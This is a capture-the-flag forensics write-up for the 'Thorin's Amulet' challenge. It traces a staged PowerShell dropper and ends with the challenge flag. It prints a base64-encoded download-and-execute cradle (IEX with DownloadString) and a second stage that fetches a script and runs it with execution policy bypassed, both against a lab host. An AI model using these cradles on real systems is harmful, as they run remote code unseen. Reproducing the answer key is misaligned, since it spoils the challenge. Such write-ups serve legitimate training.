# 🕵️ Forensics Challenge

## 🏷️ Name: Thorin’s Amulet

## 🔥 Difficulty: Very Easy

## 🎯 Points: 875

## 📜 Challenge Description: 
> Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end  Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened?
  Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.



## 📂 Provided Files:
- **Filename:** `forensics_thorins_amulet.zip`

# 🚀 Methodology

### 🔎 1️⃣ Understanding the Evidence

### Stage 1: artifact.ps1

We are given a .ps1 file - artifact.ps1, which is pretty small:

```powershell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}

```
The base64 encoded command decodes to:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")

```

### Stage 2: Update.ps1
Visting the website, it downloads a file called update.ps1:

```powershell

function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}

```

Nothing special in the stager key, but we can download the file via python:

```python
import requests

headers = {"X-ST4G3R-KEY":"5337d322906ff18afedc1edc191d325d"}
response = requests.get("http://korp.htb/a541a",headers=headers)

with open("a541a.ps1",'w') as of:
  of.write(response.content.decode())
```

### Stage 3: a541a.ps1

```powershell
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```

and this, converted from hex is the flag !

```bash
echo "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d" | xxd -r -p
```

**🚩 Final Flag:** `HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}`

